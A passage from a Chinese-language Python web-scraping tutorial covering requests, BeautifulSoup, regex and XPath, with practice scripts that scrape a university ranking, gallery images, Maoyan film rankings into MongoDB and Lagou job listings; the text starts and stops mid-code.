requests.get(url,timeout=30) r.raise_for_status() r.encoding = r.apparent_encoding return r.text except: return \"产生异常\"if __name__ == \"__main__\": url = \"http://www.xxx.com\" print(getHTMLText(url)) BeautifulSoup库 BeautifulSoup库主要用来对爬取的页面内容进行提取。BeautifulSoup是一个可以代表html的类。 一、BeautifulSoup库的基本元素1.BeautifulSoup库解析器 解析器 使用方法 条件 bs4的html解析器 BeautifulSoup(mk,’html.parser’) pip install bs4 lxml的html解析器 BeautifulSoup(mk,’lxml’) pip install lxml lxml的xml解析器 BeautifulSoup(mk,’xml’) pip install lxml html5lib的解析器 BeautifulSoup(mk,’html5lib’) pip install html5lib 2.BeautifulSoup类的基本元素tag：标签，最基本的信息组织单元，分别用&lt;&gt;和&lt;/&gt;标明开头和结尾； name：标签的名字；格式：tag.name； attributes：标签的属性，字典形式；格式：tag.attrs； navigablestring：标签内两个括号尖括起来的内容，&lt;&gt;···&lt;/&gt;，···代表的内容；格式：tag.string； comment：标签内字符串的注释部分； 123456789101112import requestsfrom bs4 import BeautifulSoupr=requests.get('https://www.baidu.com')r.encoding = r.apparent_encodingrs = r.textsoup = BeautifulSoup(rs,'html.parser')tags = soup.aprint(tags)print(tags.name)print(tags.string)print(tags.attrs) 运行结果 1234&lt;a class=\"mnav\" href=\"http://news.baidu.com\" name=\"tj_trnews\"&gt;新闻&lt;/a&gt;a新闻{'href': 'http://news.baidu.com', 'name': 'tj_trnews', 'class': ['mnav']} 二、基于bs4库的html内容遍历方法 遍历html文档的方法：下行遍历，上行遍历，平行遍历。 1.下行遍历下行遍历的属性： .contents：子节点的列表，将tag所有的儿子节点存入列表； .children：子节点的迭代类型，与.contents类似，用于循环遍历儿子节点； .descendants：子孙节点的迭代类型，包含所有子孙节点，用于循环遍历。 12345678910111213141516171819202122import requestsfrom bs4 import BeautifulSoupurl = \"https://www,baidu.com\"r = requests.get(url)r.encoding = r.apparent_encodingrs = r.textsoup = BeautifulSoup(rs,'html.parser')#遍历子节点print(soup.head.contents)#遍历儿子节点for child in soup.head.children: print(child)#children是一个迭代器print(soup.head.children)#遍历所有子孙节点for child in soup.head.descendants: print(child) print('\\n') 运行结果 123456789101112131415161718192021222324252627282930313233343536[&lt;meta content=\"text/html;charset=utf-8\" http-equiv=\"content-type\"/&gt;, &lt;meta content=\"IE=Edge\" http-equiv=\"X-UA-Compatible\"/&gt;, &lt;meta content=\"always\" name=\"referrer\"/&gt;, &lt;link href=\"https://ss1.bdstatic.com/5eN1bjq8AAUYm2zgoY3K/r/www/cache/bdorz/baidu.min.css\" rel=\"stylesheet\" type=\"text/css\"/&gt;, &lt;title&gt;百度一下，你就知道&lt;/title&gt;]&lt;meta content=\"text/html;charset=utf-8\" http-equiv=\"content-type\"/&gt;&lt;meta content=\"IE=Edge\" http-equiv=\"X-UA-Compatible\"/&gt;&lt;meta content=\"always\" name=\"referrer\"/&gt;&lt;link href=\"https://ss1.bdstatic.com/5eN1bjq8AAUYm2zgoY3K/r/www/cache/bdorz/baidu.min.css\" rel=\"stylesheet\" type=\"text/css\"/&gt;&lt;title&gt;百度一下，你就知道&lt;/title&gt;&lt;list_iterator object at 0x000001BAE9F7D8C8&gt;&lt;meta content=\"IE=Edge\" http-equiv=\"X-UA-Compatible\"/&gt;&lt;div id=\"wrapper\"&gt; &lt;div id=\"head\"&gt; &lt;div class=\"head_wrapper\"&gt; &lt;div class=\"s_form\"&gt; &lt;div class=\"s_form_wrapper\"&gt; &lt;div id=\"lg\"&gt; &lt;img height=\"129\" hidefocus=\"true\" src=\"//www.baidu.com/img/bd_logo1.png\" width=\"270\"/&gt; &lt;/div&gt; &lt;form action=\"//www.baidu.com/s\" class=\"fm\" id=\"form\" name=\"f\"&gt; &lt;input name=\"bdorz_come\" type=\"hidden\" value=\"1\"/&gt;··· &lt;/script&gt; &lt;a class=\"bri\" href=\"//www.baidu.com/more/\" name=\"tj_briicon\" style=\"display: block;\"&gt;更多产品&lt;/a&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt; &lt;div id=\"ftCon\"&gt; &lt;div id=\"ftConw\"&gt; &lt;p id=\"lh\"&gt; &lt;a href=\"http://home.baidu.com\"&gt;关于百度&lt;/a&gt; &lt;a href=\"http://ir.baidu.com\"&gt;About Baidu&lt;/a&gt; &lt;/p&gt; &lt;p id=\"cp\"&gt;©2017 Baidu &lt;a href=\"http://www.baidu.com/duty/\"&gt;使用百度前必读&lt;/a&gt; &lt;a class=\"cp-feedback\" href=\"http://jianyi.baidu.com/\"&gt;意见反馈&lt;/a&gt; 京ICP证030173号 &lt;img src=\"//www.baidu.com/img/gs.gif\"/&gt; &lt;/p&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt;&lt;div id=\"head\"&gt; &lt;div class=\"head_wrapper\"&gt; &lt;div class=\"s_form\"&gt; &lt;div class=\"s_form_wrapper\"&gt; ··· &lt;/script&gt; &lt;a class=\"bri\" href=\"//www.baidu.com/more/\" name=\"tj_briicon\" style=\"display: block;\"&gt;更多产品&lt;/a&gt; &lt;/div&gt; &lt;/div&gt; &lt;/div&gt;&lt;div class=\"head_wrapper\"&gt; &lt;div class=\"s_form\"&gt; &lt;div class=\"s_form_wrapper\"&gt; &lt;div id=\"lg\"&gt; &lt;img height=\"129\" hidefocus=\"true\" src=\"//www.baidu.com/img/bd_logo1.png\" width=\"270\"/&gt; &lt;/div&gt; ··· &lt;/script&gt; &lt;a class=\"bri\" href=\"//www.baidu.com/more/\" name=\"tj_briicon\" style=\"display: block;\"&gt;更多产品&lt;/a&gt; &lt;/div&gt; &lt;/div&gt;&lt;div class=\"s_form\"&gt; &lt;div class=\"s_form_wrapper\"&gt; &lt;div id=\"lg\"&gt; &lt;img height=\"129\" hidefocus=\"true\" src=\"//www.baidu.com/img/bd_logo1.png\" width=\"270\"/&gt; &lt;/div&gt; &lt;form action=\"//www.baidu.com/s\" class=\"fm\" id=\"form\" name=\"f\"&gt; &lt;input name=\"bdorz_come\" type=\"hidden\" value=\"1\"/&gt; ···&lt;div class=\"s_form_wrapper\"&gt; &lt;div id=\"lg\"&gt; &lt;img height=\"129\" hidefocus=\"true\" src=\"//www.baidu.com/img/bd_logo1.png\" width=\"270\"/&gt; &lt;/div&gt; &lt;form action=\"//www.baidu.com/s\" class=\"fm\" id=\"form\" name=\"f\"&gt; &lt;input name=\"bdorz_come\" type=\"hidden\" value=\"1\"/&gt; &lt;input····&lt;div id=\"lg\"&gt; &lt;img height=\"129\" hidefocus=\"true\" src=\"//www.baidu.com/img/bd_logo1.png\" width=\"270\"/&gt; &lt;/div&gt;&lt;img height=\"129\" hidefocus=\"true\" src=\"//www.baidu.com/img/bd_logo1.png\" width=\"270\"/&gt;&lt;form action=\"//www.baidu.com/s\" class=\"fm\" id=\"form\" name=\"f\"&gt; &lt;input name=\"bdorz_come\" type=\"hidden\" value=\"1\"/&gt; &lt;············ 2.上行遍历上行遍历的属性： .parent：节点的父亲标签； .parents：节点先辈标签的迭代类型，用于循环遍历先辈节点。 123456789101112131415import requestsfrom bs4 import BeautifulSoupurl = \"https://www.baidu.com\"r = requests.get(url)r.encoding = r.apparent_encodingrs = r.textsoup = BeautifulSoup(rs,'html.parser')print(soup.title.parent)#标签树的上行遍历for parent in soup.head.parents: if parent is None: print(parent) else: print(parent.name) 运行结果 1234&lt;head&gt;&lt;meta content=\"text/html;charset=utf-8\" http-equiv=\"content-type\"/&gt;&lt;meta content=\"IE=Edge\" http-equiv=\"X-UA-Compatible\"/&gt;&lt;meta content=\"always\" name=\"referrer\"/&gt;&lt;link href=\"https://ss1.bdstatic.com/5eN1bjq8AAUYm2zgoY3K/r/www/cache/bdorz/baidu.min.css\" rel=\"stylesheet\" type=\"text/css\"/&gt;&lt;title&gt;百度一下，你就知道&lt;/title&gt;&lt;/head&gt;html[document]#遍历所有先辈标签时，会遍历soup标签本身，但soup的先辈标签没有.name属性 3.平行遍历 平行遍历发生在同一个父亲节点下的各节点间。 平行遍历的属性： .next_sibling：返回按照HTML文本顺序的下一个平行节点标签； .previous_sibling：返回按照HTML文本顺序的下一个平行节点标签； .next_siblings：迭代类型，返回按照HTML文本顺序的后续所有平行节点标签； .previous_siblings：迭代类型，返回按照HTML文本格式的前续所有平行节点标签。 123456#遍历后续节点for sibling in soup.a.next_siblings: print(sibling)#遍历前续节点for sibling in soup.a.previous_siblings: print(sibling) 三、基于bs4库的html格式化和编码1.bs4库的prettify()方法 bs4库中的prettify()方法在每一个HTML标签后面加一个换行符，美化格式。 12345678910import requestsfrom bs4 import BeautifulSouphead = {'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.88 Safari/537.36'}url = \"https://www.php.net/manual/zh/index.php\"r = requests.get(url,headers = head)r.encoding = r.apparent_encodingrs = r.textsoup = BeautifulSoup(rs,'html.parser')print(soup.prettify()) 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647&lt;head&gt; &lt;meta charset=\"utf-8\"/&gt; &lt;meta content=\"width=device-width, initial-scale=1.0\" name=\"viewport\"/&gt; &lt;title&gt; PHP: PHP 手册 - Manual &lt;/title&gt; &lt;link href=\"https://www.php.net/favicon.ico\" rel=\"shortcut icon\"/&gt; &lt;link href=\"http://php.net/phpnetimprovedsearch.src\" rel=\"search\" title=\"Add PHP.net search\" type=\"application/opensearchdescription+xml\"/&gt; &lt;link href=\"https://www.php.net/releases/feed.php\" rel=\"alternate\" title=\"PHP Release feed\" type=\"application/atom+xml\"/&gt; &lt;link href=\"https://www.php.net/feed.atom\" rel=\"alternate\" title=\"PHP: Hypertext Preprocessor\" type=\"application/atom+xml\"/&gt; &lt;link href=\"https://www.php.net/manual/zh/index.php\" rel=\"canonical\"/&gt; &lt;link href=\"https://www.php.net/manual/zh/index.php\" rel=\"shorturl\"/&gt; &lt;link href=\"https://www.php.net/manual/zh/index.php\" hreflang=\"x-default\" rel=\"alternate\"/&gt; &lt;link href=\"https://www.php.net/manual/zh/index.php\" rel=\"contents\"/&gt; &lt;link href=\"https://www.php.net/manual/zh/\" rel=\"index\"/&gt; &lt;link href=\"https://www.php.net/manual/zh/\" rel=\"prev\"/&gt; &lt;link href=\"https://www.php.net/manual/zh/\" rel=\"next\"/&gt; &lt;link href=\"https://www.php.net/manual/en/index.php\" hreflang=\"en\" rel=\"alternate\"/&gt; &lt;link href=\"https://www.php.net/manual/pt_BR/index.php\" hreflang=\"pt_BR\" rel=\"alternate\"/&gt; &lt;link href=\"https://www.php.net/manual/zh/index.php\" hreflang=\"zh\" rel=\"alternate\"/&gt; &lt;link href=\"https://www.php.net/manual/fr/index.php\" hreflang=\"fr\" rel=\"alternate\"/&gt; &lt;link href=\"https://www.php.net/manual/de/index.php\" hreflang=\"de\" rel=\"alternate\"/&gt; &lt;link href=\"https://www.php.net/manual/ja/index.php\" hreflang=\"ja\" rel=\"alternate\"/&gt; &lt;link href=\"https://www.php.net/manual/ro/index.php\" hreflang=\"ro\" rel=\"alternate\"/&gt; &lt;link href=\"https://www.php.net/manual/ru/index.php\" hreflang=\"ru\" rel=\"alternate\"/&gt; &lt;link href=\"https://www.php.net/manual/es/index.php\" hreflang=\"es\" rel=\"alternate\"/&gt; &lt;link href=\"https://www.php.net/manual/tr/index.php\" hreflang=\"tr\" rel=\"alternate\"/&gt; &lt;link href=\"/cached.php?t=1539771603&amp;amp;f=/fonts/Fira/fira.css\" media=\"screen\" rel=\"stylesheet\" type=\"text/css\"/&gt; &lt;link href=\"/cached.php?t=1539765004&amp;amp;f=/fonts/Font-Awesome/css/fontello.css\" media=\"screen\" rel=\"stylesheet\" type=\"text/css\"/&gt; &lt;link href=\"/cached.php?t=1540425603&amp;amp;f=/styles/theme-base.css\" media=\"screen\" rel=\"stylesheet\" type=\"text/css\"/&gt; &lt;link href=\"/cached.php?t=1540425603&amp;amp;f=/styles/theme-medium.css\" media=\"screen\" rel=\"stylesheet\" type=\"text/css\"/&gt; &lt;!--[if lte IE 7]&gt; &lt;link rel=\"stylesheet\" type=\"text/css\" href=\"https://www.php.net/styles/workarounds.ie7.css\" media=\"screen\"&gt; &lt;![endif]--&gt; &lt;!--[if lte IE 8]&gt; &lt;script&gt; window.brokenIE = true; &lt;/script&gt; &lt;![endif]--&gt; &lt;!--[if lte IE 9]&gt; &lt;link rel=\"stylesheet\" type=\"text/css\" href=\"https://www.php.net/styles/workarounds.ie9.css\" media=\"screen\"&gt; &lt;![endif]--&gt; &lt;!--[if IE]&gt; &lt;script src=\"https://www.php.net/js/ext/html5.js\"&gt;&lt;/script&gt; &lt;![endif]--&gt; &lt;base href=\"https://www.php.net/manual/zh/index.php\"/&gt;&lt;/head&gt; 四、信息组织与提取方法1.三种信息标记形式XML：用尖括号，标签表达信息的标记形式；Internet上的信息交互与传递； 123&lt;name&gt;...&lt;/name&gt;&lt;name/&gt;&lt;!-- --&gt; JSON：用有类型的键值对标记信息的表达形式；移动应用云端和节点的信息通信，主要用于接口，无注释； 123'key':'value''key':['value1','value2']'key':{'subkey':'subvalue'} YAML：用无类型的键值对标记信息的表达形式；各类系统的配置文件，有注释易读； 123456key:valuekey:#Comment-value1-value2key: subkey:subvalue 2.信息提取的一般方法方法一：完整解析信息的标记形式，再提取关键信息；信息解析准确，但提取过程繁琐，速度慢； 方法二：无视标记形式，使用查找函数，直接搜索关键信息；提取过程简洁，速度快，但结果缺乏准确性； 融合方法：方法一 + 方法二。 例： 1234567891011import requestsfrom bs4 import BeautifulSouphead = {'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.88 Safari/537.36'}url = \"https://www.php.net/manual/zh/index.php\"r = requests.get(url,headers = head)r.encoding = r.apparent_encodingrs = r.textsoup = BeautifulSoup(rs,'html.parser')for link in soup.find_all('a'): print(link.get('href')) 运行结果 1234567891011121314151617181920212223//downloads/docs.php/get-involved/support/index.php#id2020-02-20-3/manual/en/getting-started.php/manual/en/introduction.php/manual/en/tutorial.php/manual/en/langref.php/manual/en/language.basic-syntax.php/manual/en/language.types.php/manual/en/language.variables.php/manual/en/language.constants.php/manual/en/language.expressions.php/manual/en/language.operators.php/manual/en/language.control-structures.php/manual/en/language.functions.php/manual/en/language.oop5.php/manual/en/language.namespaces.php/manual/en/language.errors.php······ 五、基于bs4库的HTML内容查找方法.find_all(name,attrs,recursive,string,**kwarges)：返回一个列表类型，存储查找的结果； name：对标签名称的检索字符串； 1234567891011121314151617181920212223242526272829303132333435363738394041find_all('a') #查找a标签find_all(['a','b']) #查找a，b标签#查找网页代码的所有标签、soup = BeautifulSoup(rs,'html.parser')for tag in soup.find_all(True): print(tag.name)返回结果：htmlheadmetatitlelink···lialiscriptaspanimg#打印以字母b开头的标签（re正则）import requestsfrom bs4 import BeautifulSoupimport rehead = {'User-Agent':'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/79.0.3945.88 Safari/537.36'}url = \"https://www.php.net/manual/zh/index.php\"r = requests.get(url,headers = head)r.encoding = r.apparent_encodingrs = r.textsoup = BeautifulSoup(rs,'html.parser')for tag in soup.find_all(re.compile('b')): print(tag.name)返回结果：basebodybrlabelbr attrs：对标签属性值的检索字符串，可标注属性检索； 1234567soup = BeautifulSoup(rs,'html.parser')print(soup.find_all('div','copyright'))运行结果：（返回内容包含©）[&lt;div class=\"copyright\"&gt;© &lt;span class=\"year\"&gt;1997-2020&lt;/span&gt;&lt;span class=\"holder\"&gt;PHP 文档组&lt;/span&gt;&lt;/div&gt;] 12345678910111213141516soup = BeautifulSoup(rs,'html.parser')print(soup.find_all('div',id = 'goto'))print(soup.find_all(id='goto'))运行结果：[&lt;div id=\"goto\"&gt;&lt;div class=\"search\"&gt;&lt;div class=\"text\"&gt;&lt;/div&gt;&lt;div class=\"results\"&gt;&lt;ul&gt;&lt;/ul&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;][&lt;div id=\"goto\"&gt;&lt;div class=\"search\"&gt;&lt;div class=\"text\"&gt;&lt;/div&gt;&lt;div class=\"results\"&gt;&lt;ul&gt;&lt;/ul&gt;&lt;/div&gt;&lt;/div&gt;&lt;/div&gt;] recursive：是否对子孙全部检索，默认是True；recursive=False； string：对&lt;&gt;…&lt;/&gt;中字符区域的检索字符串；string=’info’。 123soup.div.find_all(string = 'ihugvfcdxc')要注意的是string中的内容格式必须跟网页上的内容一致，哦负责结果返回为空soup.find_all('a',string = 'tgyhujik')soup.find_all(string = 'tgyhujik') 按id或class_查找文本内容： 123456soup.find_all(id = 'link')soup.div.find_all(id = 'link')soup.find_all('div',id = 'link')soup,find_all(class_ = 'link') #class_加下划线以区别于classsoup.div.find_all(id = 'link')soup.find_all('div',class_ = 'link') 获取子孙节点： 1234for tr in soup.find('tbody',class_ = \"hidden_zhpm\").children: print(tr('td'))for link in soup.find_all('a'): print(link.get('href')) 六、输出1.格式化输出 python一般使用.format方法来进行格式化输出。 使用： 1、按照默认顺序，不指定位置 123print(\"{} {}\".format(\"hello\",\"world\") )hello world 2、设置指定位置，可以多次使用 123print(\"{0} {1} {0}\".format(\"hello\",\"or\"))hello or hello 3、使用字典格式化 1234person = {\"name\":\"opcai\",\"age\":20}print(\"My name is {name} . I am {age} years old .\".format(**person))My name is opcai . I am 20 years old . 4、通过列表格式化 1234stu = [\"opcai\",\"linux\",\"MySQL\",\"Python\"]print(\"My name is {0[0]} , I love {0[1]} !\".format(stu))My name is opcai , I love linux ! ^, &lt;, &gt; 分别是居中、左对齐、右对齐，后面带宽度， : 号后面带填充的字符，只能是一个字符，不指定则默认是用空格填充。 大括号用大括号转义： 123print(\"{} {{0}}\".format(\"opcai_linux\"))opcai_linux {0} https://baijiahao.baidu.com/s?id=1618722730278133164&amp;wfr=spider&amp;for=pc https://www.runoob.com/python/att-string-format.html 正则表达式一、基本语法 正则表达式语法由字符和操作符构成。 1.操作符 操作符 说明 实例 . 表示任何单个字符 [ ] 字符集，对单个字符给出取值范围 [abc]，[a-z] [^ ] 非字符集，对单个字符给出排除范围 [^abc] * 前一个字符0次或无限次重复 abc*表示ab、abc、abcc等 + 前一个字符1次或无限次重复 abc+ ? 前一个字符0次或1次重复 abc? | 表达式左右任意一个 A|B，表示A或B Xpath123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960import parselimport requests'''parsel能够把缺失的HTML标签补充完整'''header = {'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36'}url = \"https://blog.ccswust.org/14569.html\"r = requests.get(url, headers = header)data = parsel.Selector(r.text) #转换数据类型，将字符串（str）转换为Selector类'''Xpath提取数据，返回的结果是一个列表，如果想要获得标签的具体内容，要使用extract()方法'''#data = parsel.Selector(r.text).getall()#data = parsel.Selector(r.text).extract()#从根节点开始获取所有img标签，精确result1 = data.xpath('/html/body/section/div/div/article/p/img').extract()#跨节点获取所有img标签, 不精确result2 = data.xpath('//img').extract()#选取当前节点，对当前节点的下一个节点进行提取，获取所有p标签下的img标签result3 = data.xpath('//p/img').extract()#或者result3 = data.xpath('//p')result4 = result3.xpath('./img').extract()#选取所有图片的url（即获取img标签的src属性）result5 = data.xpath('//p/img/@src').extract()#选取当前节点的父节点,输出结果是父节点包含的所有节点result6 = data.xpath('//p')[1] #只选取第二个列表元素result7 = result6.xpath('..').extract()#len(result7)=1#获取父节点的class属性值result8 = data.xpath('//p')result9 = result8.xpath('../@class').extract()#平行节点之间相互获取,xpath索引（从1开始）;获取第三个img标签（两种方法，注意区别）#1.result10 = data.xpath('//p[3]/img').extract() '''这里方法1有点问题，不能直接提取第三个img标签，因为前提是被提取的标签必须要有子节点，因为img标签没有子节点，所以提取到的结果为空，只能通过p标签间接提取,img标签可以限制p的范围，即所有包含img节点的p节点'''#2.(首选)result11 = data.xpath('//p/img')[2].extract()#通过属性精准定位,获取所有与需爬取图片有关的img标签,并获取所有urlresult12 = data.xpath('//img[@class=\"img-thumbnail\"]/@src').extract()#获取标签包含的文本内容,获取标题以作为保存图片的文件夹名result13 = data.xpath('//h1[@class=\"article-title\"]/text()').extract()[1]'''要注意的是，xpath提取数据会包含所有节点，不会跳过子节点，h1标签中包含了a标签，上面的代码也会输出a标签的text，只是a标签没有包含文本，所以返回结果为空上面代码如果不加[1]，返回结果为[' ', '少女情怀总是诗']''''''注意区分“利用属性值定位标签”和“获取标签的属性值”'''#模糊查询,关键字contains(属性，属性值（模糊）)result13 = data.xpath('//img[contains(@class,\"img\")]').extract()#class属性值包含“img”内容的img标签#同时选取多个标签，用 | 运算符","link":"/python%E7%88%AC%E8%99%AB%E5%9F%BA%E7%A1%80/"},{"title":"python爬虫实践","text":"1.中国大学排名(定向爬取) 爬取路线：requests+bs4； 定向爬虫：仅对某一特定的页面进行爬取，不扩展爬取； 可行性： http://www.zuihaodaxue.com/robots.txt； 实现结果： 页面结构： 12345678910111213141516171819&lt;tbody class=\"hidden_zhpm\" style=\"text-align: center;\"&gt; &lt;tr class=\"alt\"&gt; &lt;td&gt;1&lt;/td&gt; &lt;td&gt; &lt;div align=\"left\"&gt;清华大学&lt;/div&gt; &lt;/td&gt; &lt;td&gt;北京&lt;/td&gt; &lt;td&gt;95.3&lt;/td&gt; &lt;td class=\"hidden-xs need-hidden indicator5\"&gt;100.0&lt;/td&gt; &lt;td class=\"hidden-xs need-hidden indicator6\" style=\"display: none;\"&gt;97.50%&lt;/td&gt; &lt;td class=\"hidden-xs need-hidden indicator7\" style=\"display: none;\"&gt;1182145&lt;/td&gt; &lt;td class=\"hidden-xs need-hidden indicator8\" style=\"display: none;\"&gt;44730&lt;/td&gt; &lt;td class=\"hidden-xs need-hidden indicator9\" style=\"display: none;\"&gt;1.447&lt;/td&gt; &lt;td class=\"hidden-xs need-hidden indicator10\" style=\"display: none;\"&gt;1556&lt;/td&gt; &lt;td class=\"hidden-xs need-hidden indicator11\" style=\"display: none;\"&gt;121&lt;/td&gt; &lt;td class=\"hidden-xs need-hidden indicator12\" style=\"display: none;\"&gt;1586283&lt;/td&gt; &lt;td class=\"hidden-xs need-hidden indicator13\" style=\"display: none;\"&gt;500525&lt;/td&gt; &lt;td class=\"hidden-xs need-hidden indicator14\" style=\"display: none;\"&gt;6.90%&lt;/td&gt; &lt;/tr&gt; 思路： 从网页上获取页面内容; 提取需要的数据； 输出结果。 代码： 123456789101112131415161718192021222324252627282930313233343536import requestsfrom bs4 import BeautifulSoupimport bs4#获取页面内容def getHTMLText(url): try: r = requests.get(url,timeout = 30) r.raise_for_status() r.encoding = r.apparent_encoding return r.text except: return ''#提取关键信息,将html页面存放在ulist列表中def university_list(ulist,text): soup = BeautifulSoup(text,'html.parser') for tr in soup.find('tbody',class_ = \"hidden_zhpm\").children: if isinstance(tr,bs4.element.Tag):#isinstance函数检查tr中的内容是否是标签类型，过滤字符串类型 tds = tr('td') ulist.append([tds[0].string,tds[1].string,tds[2].string,tds[3].string,tds[4].string])#输出结果,num表示打印的学校数def input_university_list(ulist,num): list_width=\"{0:{5}^6}\\t{1:{5}^10}\\t{2:{5}^6}\\t{3:{5}^6}\\t{4:{5}^6}\" #{5}表示采用chr(12288)格式进行填充 print(list_width.format(\"排名\",\"学校名称\",\"省市\",\"总分\",\"生源质量\",chr(12288)))#打印表头 for i in range(num):#利用循环打印列表 u = ulist[i] print(list_width.format(u[0],u[1],u[2],u[3],u[4],chr(12288))) university_info=[]url = 'http://www.zuihaodaxue.com/zuihaodaxuepaiming2018.html'html = getHTMLText(url)university_list(university_info,html)input_university_list(university_info,20) 运行结果： format说明： format方法最主要的两个属性是填充和宽度。当从网页上爬取的文本的宽度大于或小于format设定的宽度时，format就会自动按其内定的格式进行填补，默认情况下采用英文的空格。但如果在处理汉字的时候就会遇到问题，因为汉字和英文空格的宽度不同，所以会遇到不对齐的情况。这里的解决方法就是使用chr(12288)的格式来进行填充。 2.爬取静态网站图片（re）request + re + time + os 1234567891011121314151617181920212223242526272829303132import requestsimport timeimport osimport re'''获取页面'''header = {'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36'}url = \"https://www.nange.cn/gallery/dreams\"r = requests.get(url, headers = header)html = r.text'''解析页面'''urls = re.findall('&lt;a class=\".*?\" href=\"(.*?)\" target=\".*?\" &gt;&lt;/a&gt;', html)dir_name = re.findall('&lt;h1&gt;(.*?)&lt;/h1&gt;', html)[-1]'''创建目录，下载照片'''if not os.path.exists(dir_name): os.mkdir(dir_name)for url in urls: time.sleep(1) response = requests.get(url, headers = header) file_name = url.split('/')[-1] with open(dir_name + '\\\\' + file_name, 'wb') as f: f.write(response.content) 运行结果 3.爬取静态网站图片（Xpath）request + parsel（Xpath） + time + os 123456789101112131415161718192021222324import requestsimport parselimport osimport timeheader = {'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36'}url = \"https://blog.ccswust.org/14569.html\"r = requests.get(url, headers = header)html = r.textdata = parsel.Selector(html)dir_name = './爬虫代码/3' + '/' + data.xpath('//h1[@class=\"article-title\"]/text()').extract()[-1]urls = data.xpath('//p/img/@src').extract()if not os.path.exists(dir_name): os.mkdir(dir_name)for url in urls: time.sleep(1) r = requests.get(url, headers = header) file_name = url.split('?')[0].split('/') file_name = file_name[-3] + file_name[-2] + file_name[-1] with open(dir_name + '/' + file_name, 'wb') as f: f.write(r.content) 运行结果 3.猫眼电影Top100（mongo数据库）requests + xpath + mongo数据库 12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849505152535455565758596061626364656667686970717273import requestsimport parselimport pymongoimport timeclass Maoyan(): def __init__(self, url, headers): self.url = url self.headers = headers # 请求页面 def get_html(self): r = requests.get(self.url, headers=self.headers) r.encoding = r.apparent_encoding self.html = r.text # 解析页面（Xpath）,返回字典 def get_data(self): data = parsel.Selector(self.html) self.names = data.xpath('//p[@class=\"name\"]/a/text()').extract() self.stars = data.xpath('//p[@class=\"star\"]/text()').extract() self.releasetimes = data.xpath('//p[@class=\"releasetime\"]/text()').extract() score1 = data.xpath('//p[@class=\"score\"]/i[@class=\"integer\"]/text()').extract() score2 = data.xpath('//p[@class=\"score\"]/i[@class=\"fraction\"]/text()').extract() self.scores = [] for i in range(0, 10): self.scores.append(score1[i] + score2[i])headers = { 'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9', 'Accept-Encoding': 'gzip, deflate, br', 'Accept-Language': 'zh-CN,zh;q=0.9', 'Cache-Control': 'max-age=0', 'Connection': 'keep-alive', 'Cookie': '_lxsdk_s=1714d9e4259-ff7-dcf-a5e%7C%7C1', 'Host': 'maoyan.com', 'Sec-Fetch-Dest': 'document', 'Sec-Fetch-Mode': 'navigate', 'Sec-Fetch-Site': 'cross-site', 'Sec-Fetch-User': '?1', 'Upgrade-Insecure-Requests': '1', 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36'}mongo_connect = 'mongodb://localhost:27017' #数据库连接mongo_db_name = 'maoying_movies' #数据库名mongo_collection_name = 'movies' #表名client = pymongo.MongoClient(mongo_connect) #创建连接（继承MongoClient类）db = client[mongo_db_name] #创建数据库collection = db[mongo_collection_name] #创建表#获取top100for i in range(0,10): time.sleep(5) url = \"https://maoyan.com/board/4?offset=\" + str(i * 10) #翻页规则 data = Maoyan(url, headers) data.get_html() data.get_data() for i in range(0,10): print(data.names[i].strip() + data.stars[i].strip() + data.releasetimes[i].strip() + data.scores[i].strip()) #存入数据库 for i in range(0,10): movie = { 'name': data.names[i].strip(), 'start': data.stars[i].strip(), 'releasetime': data.releasetimes[i].strip(), 'score': data.scores[i].strip() } collection.update_one({'name': movie['name']}, {'$set': movie}, upsert=True) ''' 使用update_one来更新或插入数据，第一个{}表示查询条件，第二个{}利用$set操作符插入数据，upsert表示更新或插入，那么存在则更新，不存在则插入（创建）''' 运行结果： 4.拉勾网1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374import requests#import pprintimport time#获取要访问页面的cookiedef get_cookies(url): headers = { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36' } response = requests.get(url, headers = headers) return response.cookies#要访问的页面所需要的表单数据（在浏览器中找），除第一页外，其他页都有sid参数，sid参数从前一个页面获取def get_data(first, pn, sid): data = { 'first': first, 'pn': pn, 'kd': 'python', 'sid': sid } return dataheaders = { 'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36', 'Origin': 'https://www.lagou.com', 'Referer': 'https://www.lagou.com/jobs/list_python?labelWords=&amp;fromSearch=true&amp;suginput=' }for page in range(1,31): time.sleep(11) ''' 经过分析，访问https://www.lagou.com/jobs/list_python?labelWords=&amp;fromSearch=true&amp;suginput=无法获取数据， 需要在xhr中找到对应的数据页面然后通过规定的方法（post）发送请求，其中cookie可在链接过来的页面的到（referer） ''' url = \"https://www.lagou.com/jobs/positionAjax.json?needAddtionalResult=false\" cookies = get_cookies('https://www.lagou.com/jobs/list_python?labelWords=&amp;fromSearch=true&amp;suginput=') if page == 1: first = True sid = '' data = get_data(first, page, sid) else: first = False data = get_data(first, page, sid) response = requests.post(url, 